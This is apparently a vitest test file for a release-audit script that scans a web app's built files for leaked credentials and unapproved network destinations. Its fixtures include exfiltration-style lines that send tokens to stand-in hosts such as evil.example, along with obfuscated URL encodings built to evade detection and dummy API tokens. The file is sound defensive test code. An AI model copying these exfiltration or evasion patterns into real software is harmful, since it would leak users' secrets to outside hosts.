import { mkdir, mkdtemp, symlink, writeFile } from "node:fs/promises";
import { join, resolve } from "node:path";
import { tmpdir } from "node:os";
import { describe, expect, it } from "vitest";
import {
  scanReleaseDestinations,
  scanReleaseSecrets,
} from "../../scripts/private-hosted/audit-release-basics.js";

async function fixture(files: Record<string, string | Uint8Array>): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), "conan-release-basics-"));
  const dist = resolve(root, "dist");
  await mkdir(dist);
  for (const [path, content] of Object.entries(files)) {
    const target = resolve(dist, path);
    await mkdir(resolve(target, ".."), { recursive: true });
    await writeFile(target, content);
  }
  return root;
}

describe("private hosted basic release scans", () => {
  it("accepts same-origin assets and the approved official card image origin", async () => {
    const root = await fixture({
      "index.html": '<script src="/assets/app.js"></script>',
      "assets/app.js": [
        'const image="https://www.takaratomy.co.jp/products/conan-cardgame/storage/card/a.webp";',
        'const svg="http://www.w3.org/2000/svg";',
        String.raw`const pattern=/\/\/+ /;`,
      ].join("\n"),
      "_headers": "Content-Security-Policy: img-src https://www.takaratomy.co.jp;",
    });

    expect(await scanReleaseSecrets(root)).toEqual([]);
    expect(await scanReleaseDestinations(root)).toEqual([]);
  });

  it("rejects credentials embedded in nested release files", async () => {
    const token = "abcdefghijklmnopqrstuvwxyz123456";
    const root = await fixture({
      "assets/app.js": [
        `const headers={Authorization:"Bearer ${token}"};`,
        'const basic={Authorization:"Basic YWxpY2U6c2VjcmV0MTIzNDU2Nzg5"};',
        `const access={"CF-Access-Client-Secret":"${token}"};`,
        `const diagnostic="https://react.dev/errors/418?api_token=${token}";`,
      ].join("\n"),
      "copied-config": `CLOUDFLARE_API_TOKEN=${token}`,
    });

    const findings = await scanReleaseSecrets(root);
    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ file: "dist/assets/app.js", code: "embedded-secret" }),
      expect.objectContaining({ file: "dist/copied-config", code: "embedded-secret" }),
    ]));
    expect(JSON.stringify(findings)).not.toContain(token);
  });

  it("rejects unapproved HTTP, WebSocket, and protocol-relative destinations", async () => {
    const token = "abcdefghijklmnopqrstuvwxyz123456";
    const pathToken = "webhook-secret-abcdefghijklmnopqrstuvwxyz";
    const root = await fixture({
      "assets/app.js": [
        'fetch("https://example.invalid/state")',
        'new WebSocket("wss://example.invalid/socket")',
        'new WebSocket("ws://example.invalid/socket")',
        'const cdn="//cdn.example.invalid/app.js"',
        'const lookalike="https://www.takaratomy.co.jp.example.invalid/card.webp"',
        'const extendedShortLink="https://bit.ly/3cXEKWf-extra"',
        'fetch("https://alice:abcdefghijklmnopqrstuvwxyz@evil.example/state")',
        'fetch("https://alice@evil.example/state")',
        'fetch("https://[2606:4700:4700::1111]/state")',
        `fetch("https://evil.example/state?api_token=${token}")`,
        `fetch("https://evil.example/hooks/${pathToken}")`,
        String.raw`fetch("https:\x2f\x2fescaped.example/state")`,
        String.raw`fetch("https:\\backslash.example/state")`,
        '<a href="https:&sol;&sol;entity.example/state">',
      ].join("\n"),
    });

    const findings = await scanReleaseDestinations(root);
    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ detail: "https://example.invalid" }),
      expect.objectContaining({ detail: "wss://example.invalid" }),
      expect.objectContaining({ detail: "ws://example.invalid" }),
      expect.objectContaining({ detail: "//cdn.example.invalid" }),
      expect.objectContaining({ detail: "https://www.takaratomy.co.jp.example.invalid" }),
      expect.objectContaining({ detail: "https://bit.ly" }),
      expect.objectContaining({ detail: "https://evil.example" }),
      expect.objectContaining({ detail: "https://[2606:4700:4700::1111]" }),
      expect.objectContaining({ detail: "https://escaped.example" }),
      expect.objectContaining({ detail: "https://backslash.example" }),
      expect.objectContaining({ detail: "https://entity.example" }),
    ]));
    expect(JSON.stringify(findings)).not.toContain(token);
    expect(JSON.stringify(findings)).not.toContain(pathToken);
  });

  it("scans the explicitly selected staged artifact instead of repository dist", async () => {
    const token = "abcdefghijklmnopqrstuvwxyz123456";
    const root = await fixture({ "assets/app.js": "export {};" });
    const staging = resolve(root, "staging");
    await mkdir(staging);
    await writeFile(
      resolve(staging, "app.js"),
      `const token="api_token=${token}";fetch("https://evil.example/state")`,
    );

    expect(await scanReleaseSecrets(root)).toEqual([]);
    expect(await scanReleaseDestinations(root)).toEqual([]);
    expect(await scanReleaseSecrets(root, staging)).toEqual([
      expect.objectContaining({ file: "staging/app.js", code: "embedded-secret" }),
    ]);
    expect(await scanReleaseDestinations(root, staging)).toEqual([
      expect.objectContaining({ file: "staging/app.js", detail: "https://evil.example" }),
    ]);
  });

  it("decodes UTF-16 release text before scanning", async () => {
    const token = "abcdefghijklmnopqrstuvwxyz123456";
    const source = `CLOUDFLARE_API_TOKEN=${token}\nfetch("https://evil.example/state")`;
    const littleEndian = Buffer.concat([
      Buffer.from([0xff, 0xfe]),
      Buffer.from(source, "utf16le"),
    ]);
    const bigEndianBody = Buffer.from(source, "utf16le");
    for (let index = 0; index < bigEndianBody.length; index += 2) {
      [bigEndianBody[index], bigEndianBody[index + 1]] = [
        bigEndianBody[index + 1]!,
        bigEndianBody[index]!,
      ];
    }
    const root = await fixture({
      "little.html": littleEndian,
      "big.html": Buffer.concat([Buffer.from([0xfe, 0xff]), bigEndianBody]),
    });

    expect(await scanReleaseSecrets(root)).toHaveLength(2);
    expect(await scanReleaseDestinations(root)).toEqual([
      expect.objectContaining({ file: "dist/big.html", detail: "https://evil.example" }),
      expect.objectContaining({ file: "dist/little.html", detail: "https://evil.example" }),
    ]);
  });

  it("fails closed when dist is missing or contains a symbolic link", async () => {
    const missing = await mkdtemp(join(tmpdir(), "conan-release-basics-missing-"));
    await expect(scanReleaseSecrets(missing)).rejects.toThrow(/dist/);

    const root = await fixture({ "assets/app.js": "export {};" });
    const external = resolve(root, "external");
    await mkdir(external);
    await symlink(external, resolve(root, "dist/linked"), "junction");
    await expect(scanReleaseDestinations(root)).rejects.toThrow(/symbolic link/);
  });
});
